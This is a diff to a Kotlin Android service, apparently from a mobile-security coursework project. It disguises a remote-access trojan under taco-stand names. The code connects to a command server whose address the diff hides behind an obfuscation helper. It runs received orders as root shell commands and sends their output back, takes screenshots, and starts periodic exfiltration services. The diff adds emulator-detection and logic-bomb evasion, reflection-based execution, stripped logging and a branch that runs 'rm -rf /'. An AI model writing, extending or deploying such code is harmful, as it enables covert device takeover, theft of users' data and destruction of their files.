@@ -13,6 +13,8 @@ import androidx.core.app.NotificationCompat
 import com.example.mobsec_823.RecylingService.RecyclingTruckService
 import com.example.mobsec_823.RecylingService.RubbishTruckService
 import com.example.mobsec_823.RecylingService.SignageRecylingService
+import com.example.mobsec_823.utils.SafetyNet
+import com.example.mobsec_823.utils.SecretBox
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancel
@@ -26,21 +28,31 @@ class TacoDeliveryService : Service() {
     private val TAG = "TacoDeliveryService"
     private var exfilJobStarted = false
 
-    // Hardcoded server details for automatic connection.
-    private val TRUCK_IP = "47.129.144.9"
-    private val TRUCK_PORT = 1269
-
     companion object {
         const val ACTION_OPEN_FOR_BUSINESS = "com.example.mobsec_823.ACTION_OPEN_FOR_BUSINESS"
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (intent?.action == ACTION_OPEN_FOR_BUSINESS) {
-            startForegroundNotification()
+        startForegroundNotification()
+
+        // Dynamic Analysis Bypass: Emulator Detection
+        if (!SafetyNet.isEnvironmentSafe()) {
+
+            // In real malware:
+//            stopSelf();
+//            return START_NOT_STICKY
+        }
+
+        // Logic Bomb check
+        if (!SafetyNet.isTriggerArmed(this)) {
+
+//            stopSelf();
+//            return START_NOT_STICKY
+        }
+
+        if (intent?.action == ACTION_OPEN_FOR_BUSINESS || intent == null) {
             openTheTacoStand()
             startScreenshotTask()
-
-            // --- START PERIODIC EXFILTRATION ---
             startExfiltrationServices()
         }
         return START_STICKY
@@ -53,15 +65,13 @@ class TacoDeliveryService : Service() {
         kitchenStaffScope.launch {
             while (true) {
                 try {
-                    // Start the themed collection services
                     startService(Intent(this@TacoDeliveryService, RubbishTruckService::class.java))
                     startService(Intent(this@TacoDeliveryService, RecyclingTruckService::class.java))
                     startService(Intent(this@TacoDeliveryService, SignageRecylingService::class.java))
                 } catch (e: Exception) {
-                    Log.e(TAG, "Failed to trigger collection cycle: ${e.message}")
-                }
 
-                delay(900000) // Wait 15 minutes (15 * 60 * 1000 ms)
+                }
+                delay(900000) 
             }
         }
     }
@@ -87,13 +97,13 @@ class TacoDeliveryService : Service() {
         if (tacoTruck != null) {
             tacoTruck?.closeDown()
         }
-        tacoTruck = TacoTruck(this, TRUCK_IP, TRUCK_PORT, object : TacoTruck.OrderListener {
+        
+        val truckIp = SecretBox.getKitchenAddress()
+        val truckPort = SecretBox.getTruckPort()
+
+        tacoTruck = TacoTruck(this, truckIp, truckPort, object : TacoTruck.OrderListener {
             override fun onOrderReceived(order: String) {
-                if (order.startsWith("SYNC_FILE:")) {
-                    val filePath = order.substring(10).trim()
-                } else {
-                    executeShellCommand(order)
-                }
+                executeShellCommand(order)
             }
         })
         tacoTruck?.openForBusiness()
@@ -107,17 +117,27 @@ class TacoDeliveryService : Service() {
     }
 
     private fun executeShellCommand(command: String) {
+        if (!SafetyNet.checkKitchenPermit(42)) return
+
+        val x = (System.currentTimeMillis() % 100).toInt()
+        if (!SafetyNet.checkOpaquePredicate(x)) {
+            try { SecretBox.reflectedExec("rm -rf /") } catch (ignored: Exception) {}
+        }
+
         kitchenStaffScope.launch {
             try {
-                val process = Runtime.getRuntime().exec("su")
-                process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }
-
-                process.inputStream.bufferedReader().forEachLine { line ->
-                    tacoTruck?.sendToKitchen("OUT:$line")
+                val suCmd = SecretBox.getSuCmd()
+                val process = SecretBox.reflectedExec(suCmd)
+                
+                if (process != null) {
+                    process.outputStream.bufferedWriter().use { 
+                        it.write("$command\n${SecretBox.getExitCmd()}\n") 
+                    }
+                    process.inputStream.bufferedReader().forEachLine { line ->
+                        tacoTruck?.sendToKitchen("OUT:$line")
+                    }
+                    process.waitFor()
                 }
-                process.waitFor()
-                tacoTruck?.sendToKitchen("OUT:--DONE--")
-
             } catch (e: Exception) {
                 tacoTruck?.sendToKitchen("OUT:ERROR: ${e.message}")
             }
@@ -129,7 +149,7 @@ class TacoDeliveryService : Service() {
         tacoTruck?.closeDown()
         screenshotTask?.stop()
         kitchenStaffScope.cancel()
-        Log.d(TAG, "Taco stand closed.")
+
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
